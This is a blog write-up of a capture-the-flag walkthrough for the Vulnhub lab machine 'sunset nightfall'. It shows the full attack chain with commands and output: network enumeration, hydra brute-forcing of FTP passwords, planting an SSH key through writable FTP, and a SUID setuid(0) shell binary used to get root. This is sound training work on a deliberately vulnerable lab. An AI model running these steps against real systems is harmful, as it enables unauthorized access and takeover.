<html>

<?php include '../header.php';?>

<body>

<?php include '../navbar.php';?>

    <div class="body-content">
        <h2>
            Nightfall  
        </h2>
        <img class="headerpic" src="http://placekitten.com/200/300" alt="Hack the Planet" height="200px" width="300px" align="middle" align="left">
        <p class="text">
            The box, nightfall, in the sunset series was created by <a href="https://www.vulnhub.com/author/whitecr0wz,630/">@whitecr0wz</a>.  It was relatively easy, giving good experience for a beginner's enumeration strategy.  Unfortunately, there were a ton of dead ends that tested my patience, but I really enjoyed the privilege escalation method, which I think was unintended.  Let's get started.
            <br><br>
            I began by downloading the torrent from Vulnhub here: <a href="https://www.vulnhub.com/entry/sunset-nightfall,355/">https://www.vulnhub.com/entry/sunset-nightfall,355//</a>.  I took the recommendation of the author to import the file into Virtualbox, adjusted the networking settings, and started the VM.  As always, I looked for new hosts with an IP address on my current subnet using arp-scan.
        </p>
        <pre>
            root@kali:# arp-scan -l
            Interface: eth0, datalink type: EN10MB (Ethernet)
            Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)
            192.168.0.189   08:00:27:b5:56:ed   Cadmus Computer Systems
        </pre>
        <p class="text">
            After that, I ran my (bash) enumeration script.  The script can be found here: <a href="https://github.com/caryhooper/scripts/blob/master/enum-automation.sh">enum-automation.sh</a>.  This script automates the nmap scan, checks for common services (right now just HTTP(S) and FTP), and initiates follow-on enumeration programs such as dirb and nikto.  
        </p>
        <pre>
            root@kali:# ./enum-automation.sh 192.168.0.189
            Initial Host Enumeration Script
            by Cary Hooper @nopantrootdance
            [!] Detected HTTP/HTTPS
            [!] Port 80 is a web service
            [!] Port 443 is a web service
                [*] Starting nikto against port 80
                [*] Starting dirb against port 80
                [*] Starting nikto against port 443
                [*] Starting dirb against port 443

            Program Complete
        </pre>
        <p class="text">
            Looking at the nmap scan, we see services running on six ports: 21,22,80,139,445,3306.
        </p>
        <pre>
            Host is up (0.00041s latency).
            Not shown: 65529 closed ports
            PORT     STATE SERVICE       VERSION
            21/tcp   open  ftp           pyftpdlib 1.5.5
            22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10 (protocol 2.0)
            80/tcp   open  http          Apache httpd 2.4.38 ((Debian))
            139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
            445/tcp  open  microsoft-ds?
            3306/tcp open  mysql         MySQL 5.5.5-10.3.15-MariaDB-1
            MAC Address: 08:00:27:B5:56:ED (Oracle VirtualBox virtual NIC)
            Service Info: Host: NIGHTFALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel
        </pre>
        <p class="text">
            Looks like we have another Linux host.  This seems to be a pretty standard stack, except for the FTP service, which I have used in the past.  The python module, pyftpdlib can be used to spin up a quick FTP server for file exfil/download/testing.  You can create a writeable ftp service on port 2121 by using the command: <b>python -m pyftpdlib 2121 -w</b>.<br>
            Next, I began enumeration of the external services.  First, I tried to log in anonymously to FTP, but was unsuccessful.  Next, I took a look at the results of dirb and nikto, but they yielded nothing but a vanilla Apache web server.  I started up dirbuster in the background with my massive directory-busting list.  Next, I ran the perl script, enum4linux to help enumerate the SMB service.  Last, I attempted to connect to the MySQL service with no password.  I was only able to glean usable information from the enum4linux output (truncated):
        <pre>
            root@kali:# cat enum4linux 
            Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Sep 17 16:41:45 2019

             ========================== 
            |    Target Information    |
             ========================== 
            Target ........... 192.168.0.183
            RID Range ........ 500-550,1000-1050
            Username ......... ''
            Password ......... ''

             ========================================== 
            |    Share Enumeration on 192.168.0.183    |
             ========================================== 

                Sharename       Type      Comment
                ---------       ----      -------
                print$          Disk      Printer Drivers
                IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
            Reconnecting with SMB1 for workgroup listing.

                Server               Comment
                ---------            -------

                Workgroup            Master
                ---------            -------
                WORKGROUP            NIGHTFALL

            [+] Password Info for Domain: NIGHTFALL

                [+] Minimum password length: 5
                [+] Password history length: None
                [+] Maximum password age: 37 days 6 hours 21 minutes 
                [+] Password Complexity Flags: 000000

                    [+] Domain Refuse Password Change: 0
                    [+] Domain Password Store Cleartext: 0
                    [+] Domain Password Lockout Admins: 0
                    [+] Domain Password No Clear Change: 0
                    [+] Domain Password No Anon Change: 0
                    [+] Domain Password Complex: 0

                [+] Minimum password age: None
                [+] Reset Account Lockout Counter: 30 minutes 
                [+] Locked Account Duration: 30 minutes 
                [+] Account Lockout Threshold: None
                [+] Forced Log off Time: 37 days 6 hours 21 minutes 

            [+] Retieved partial password policy with rpcclient:

            Password Complexity: Disabled
            Minimum Password Length: 5

            [+] Enumerating users using SID S-1-22-1 and logon username '', password ''
            S-1-22-1-1000 Unix User\nightfall (Local User)
            S-1-22-1-1001 Unix User\matt (Local User)

            enum4linux complete on Tue Sep 17 16:42:37 2019
        </pre>
        <p class=text>
        The tool, enum4linux utilizes some well-known techniques to learn about a server hosting SMB.  In the output above, we learn the password policy of the host!  This is conducted by connecting to a null session ($IPC).  Next, we can see it actually enumerates users!  This is done by SID brute-forcing.  The tool queries the server for users assigned a certain SID.  Usually, SIDs are reserved for Windows users, but due to compatibility issues between Linux and Windows hosts, Samba servers typically assign SIDs to users.<br>
        As my directory busting was whirring in the background, I was out of options.  I don't usually like to try and brute-force passwords, but I felt it was my only option. The password policy was incredibly loose as well (minimum 5 characters for a password).  Of the four external services allowing authentication (FTP,SSH,SMB,MySQL), I selected FTP.  SSH and SMB are typically slower and limit the login attempt rate.  MySQL often uses different username/password pairs than the system.  Therefore, I used hydra to brute-force the passwords.  I loaded "matt" and "nightfall" into a file called users.txt and ran the following:
        </p>
        <pre>
            root@kali:# hydra -vV -L users.txt -P passwords.txt ftp://192.168.0.189

            Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-19 05:42:10
            [DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:2/p:1), ~1 try per task
            [DATA] attacking ftp://192.168.0.189:21/
            [VERBOSE] Resolving addresses ... [VERBOSE] resolving done
            [ATTEMPT] target 192.168.0.189 - login "matt" - pass "cheese" - 1 of 2 [child 0] (0/0)
            [ATTEMPT] target 192.168.0.189 - login "nightfall" - pass "cheese" - 2 of 2 [child 1] (0/0)
            [21][ftp] host: 192.168.0.189   login: <b>matt</b>   password: <b>cheese</b>
            [STATUS] attack finished for 192.168.0.189 (waiting for children to complete tests)
        </pre>
        <p class=text>
            Any password list will do for this attack.  I prefer to use the one in the Passwords directory of Daniel Miessler's repository, <a href="https://github.com/danielmiessler/SecLists">SecLists</a>. As you can see from the output above, we have found matt's password.  Next, I tried logging into each of the other services with these newfound credentials and found the following information:
            <h4>FTP</h4>
            <ul>
                <li>FTP root was writable.</li>
                <li>FTP root appeared to be matt's home directory (/home/matt).</li>
                <li>ftp 192.168.0.189</li>
            </ul>
            <h4>SSH</h4>
            <ul>
                <li>SSH did not allow login with matt:cheese</li>
                <li>When logging in, I recieved a "password denied" error.</li>
                <li>ssh matt@192.168.0.189</li>
            </ul>
            <h4>SMB</h4>
            <ul>
                <li>An anonymous enum4linux showed there were no available shares.</li>
                <li>Connecting as matt confirmed this fact.</li>
                <li>smbclient -L NIGHTFALL -I 192.168.0.189 -U matt</li>
            </ul>
            <h4>MySQL</h4>
            <ul>
                <li>Access denied to DB as root user and as matt (both with and without passwords)</li>
                <li>mysql -h 192.168.0.189 -u root -p</li>
            </ul>
            <br>
            By this time, dirbuster had finished and found no new directories or content. :(<br>
            After this enumeration, the only reasonable way forward was through FTP.  One of the older tricks of persistance is to place your public key in to a compromised server's "authorized_keys" file.  Then, when an SSH server is configured to accept public key authentication, it will allow login if the public key matches a known good.  I think Kevin Mitnik did something like this during his computer exploitation days.  More about this method <a href="https://www.ssh.com/ssh/public-key-authentication">here</a>.  Since we have write access to matt's home directory, we should be able to write an authorized_keys file.
            <pre>
                root@kali:# cat ~/.ssh/id_rsa.pub > authorized_keys
                root@kali:# ftp 192.168.0.189
                &lt;TRUNCATED&gt;
                ftp> mkdir .ssh
                257 "/.ssh" directory created.
                ftp> cd .ssh
                250 "/.ssh" is the current directory.
                ftp> put authorized_keys
                local: authorized_keys remote: authorized_keys
                200 Active data connection established.
                125 Data connection already open. Transfer starting.
                226 Transfer complete.
                397 bytes sent in 0.03 secs (12.0283 kB/s)
                ftp> exit
                root@kali:# ssh matt@192.168.0.189
                inux nightfall 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) x86_64

                Last login: Fri Sep 20 17:56:55 2019 from 192.168.0.196
                matt@nightfall:~$ 
            </pre>
            <p>
                Great! Now we have a shell as "matt" (a very stable shell, as a matter of fact). While poking around, typically, I issue "uname -a", "cat /etc/issue", "ls -al /home", "ls -al /", etc.  This helps me understand the context of where I am on the machine.  I may look at the processes, view the user groups, or look for interesting (SUID/GUID/custom) binaries.  In this case, however, something stuck out like a sore thumb.
            </p>
            <pre>
                matt@nightfall:~$ ls -al
                total 36
                drwxr-xr-x 5 matt matt 4096 Sep 20 18:03 .
                drwxr-xr-x 4 root root 4096 Aug 25 20:34 ..
                -rw------- 1 matt matt  662 Sep 19 07:55 .bash_history
                -rw-r--r-- 1 matt matt  220 Aug 25 20:34 .bash_logout
                -rw-r--r-- 1 matt matt 3526 Aug 25 20:34 .bashrc
                drwx------ 3 matt matt 4096 Aug 28 17:26 .gnupg
                drwxr-xr-x 3 matt matt 4096 Aug 25 20:42 .local
                -rw-r--r-- 1 matt matt  807 Aug 25 20:34 .profile
                -rw------- 1 matt matt    0 Aug 28 18:41 .sh_history
                drwxr-xr-x 2 root root 4096 Sep 20 17:57 .ssh
            </pre>
            <p>
                Notice anything intersting?  To me, one particular detail stood out... the ".ssh" folder was owned by root!  I just created that folder.  To make sure, I checked the authorized_keys folder.  It was also owned by root!  I'd seen this sort of weakness before and decided to try and exploit it.  <br>
                <br>
                The idea behind the exploitation is that if I can write an arbitrary file to the disk as the root user, and change the permissions as a root user, then I can create my own backdoor to gain root privileges.  At the time that I saw this, I wasn't sure if this vector was possible, but I decided to try it out anyway.  First, I made note of the architecture (x86_64), transferred "dash" to the remote system, and changed the permissions so it was SUID. 
            </p>
            <pre>
                ls -al
                total 156
                drwxr-xr-x 5 matt matt   4096 Sep 20 18:08 .
                drwxr-xr-x 4 root root   4096 Aug 25 20:34 ..
                -rw------- 1 matt matt    662 Sep 19 07:55 .bash_history
                -rw-r--r-- 1 matt matt    220 Aug 25 20:34 .bash_logout
                -rw-r--r-- 1 matt matt   3526 Aug 25 20:34 .bashrc
                -rwsrwxrwx 1 root root 121464 Sep 20 18:08 dash
                drwx------ 3 matt matt   4096 Aug 28 17:26 .gnupg
                drwxr-xr-x 3 matt matt   4096 Aug 25 20:42 .local
                -rw-r--r-- 1 matt matt    807 Aug 25 20:34 .profile
                -rw------- 1 matt matt      0 Aug 28 18:41 .sh_history
                drwxr-xr-x 2 root root   4096 Sep 20 17:57 .ssh
                matt@nightfall:~$ ./dash
                $ whoami
                matt
                $ id
                uid=1001(matt) gid=1001(matt) groups=1001(matt)
                $ 
            </pre>
            <p>
                Unfortunately, when I ran "dash", I didn't get a root shell.  For those of you that don't know, dash is an alternative shell to /bin/sh and /bin/bash.  In fact, it is listed on many systems within the /etc/shells folder.  Some versions of dash will allow you to run it as SUID root.  Unfortunately, some versions of dash and bash conduct checks to see if it is being invoked with SUID privileges and runs at normal privileges instead.  I was familiar with this concept, so I persisted.  I created a file in C which spawned bash as the root user:
            </p>
            <pre>
                root@kali:# cat root.c
                #include &lt;stdio.h&gt;
                int main(){
                setuid(0);
                if(getuid()){printf("program not suid root\n");
                } else { system("/bin/bash"); }
                return 0;                }
                root@kali:# gcc root.c -o root -Wno-all
            </pre>
            <p>
                Next, we transfer the compiled ELF binary, "root", to the remote server via FTP, chmod it to 4777, then attempt to execute again.  
            </p>
            <pre>
                matt@nightfall:~$ ls -al root
                -rwsrwxrwx 1 root root 16760 Sep 20 18:15 root
                matt@nightfall:~$ ./root
                root@nightfall:~# whoami
                root
                root@nightfall:~# id
                uid=0(root) gid=1001(matt) groups=1001(matt)
                root@nightfall:~# cat /home/nightfall/user.txt 
                97fb7140ca325ed96f67be3c9e30083d
                root@nightfall:~# cat /root/root_super_secret_flag.txt 
                Congratulations! Please contact me via twitter and give me some feedback! @whitecr0w1
                &lt;TRUNCATED&gt;
                Thank you for playing! - Felipe Winsnes (whitecr0wz)  
                    flag{9a5b21fc6719fe33004d66b703d70a39}
            </pre>
            <p>
                And we have a root shell!  Thank you, Filipe, for running a python ftp server as the root user!  To be honest, I didn't know this technique would even work until I attempted to pwn this box.  So props to Filipe for teaching me something new.  Who knew you could change permissions of files via FTP!?  After some post-exploitation of the box, it seemed apparant there were other ways to escalate privilege.  First, it appeared that the user "nightfall" had sudo privileges to read any file:
            </p>
            <pre>
                root@nightfall:~# cat /etc/sudoers
                &lt;TRUNCATED&gt;
                
                root    ALL=(ALL:ALL) ALL
                nightfall ALL=NOPASSWD:/usr/bin/cat<br>
                
                &lt;TRUNCATED&gt;
                root@nightfall:~# 
            </pre>
            <p>
                It also looked like there existed a /scripts folder containing a SUID "find" binary owned by nightfall.  This may have been a privilege escalation vector to get from matt to nightfall.  Anyway, I liked my method better.  r00tr00t! 
            </p>

    </div>


</body>
<?php include '../footer.php';?>
</html>
